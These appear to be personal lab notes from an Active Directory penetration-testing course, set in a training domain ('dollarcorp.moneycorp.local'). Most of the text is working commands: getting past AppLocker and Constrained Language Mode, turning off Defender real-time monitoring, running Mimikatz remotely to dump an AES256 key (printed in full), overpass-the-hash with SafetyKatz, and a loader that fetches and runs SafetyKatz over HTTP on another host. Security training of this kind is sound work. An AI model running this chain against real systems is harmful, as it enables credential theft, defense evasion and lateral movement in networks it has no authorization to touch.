Costrained Language Mode.

Error as shown:

Cannot invoke method. Method invocation is supported only on core types in this language mode.

$ExecutionContext.SessionState.LanguageMode -> If CostrainedLanguage -> AppLocker

1st. Check AppLocker Policies.
    Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
    
We can also check same policies running a cmd through winrs
    winrs -r:dcorp-adminsrv cmd
    reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
    
    
2nd. Since we saw we could only execute 'exe' binarys microsoft signed and theres a policy that allow us to run scripts in the Program File Folder we copy Mimikatz there    
    
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
Copy-Item C:\AD\Tools\Invoke-MimikatzEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
Enter-PSSession dcorp-adminsrv

3. Run Mimikatz
cd 'C:\Program Files'
.\Invoke-MimikatzEx.ps1

With the AES256 of the USER of the hostname I.E -> dcorp-adminsrv

user:srvadmin
aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4

Exit and from the student-vm OVERPASSTHEHASH:
SafetyKatz.exe "sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /run:cmd.exe" "exit"
New Process starts with srvadmin privileges.

4. Check if srvadmin has admin privileges in any other machine

PS C:\Windows\system32> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS C:\Windows\system32> Find-PSRemotingLocalAdminAccess -Verbose
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe /Y

winrs -r:dcorp-mgmt cmd
Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit


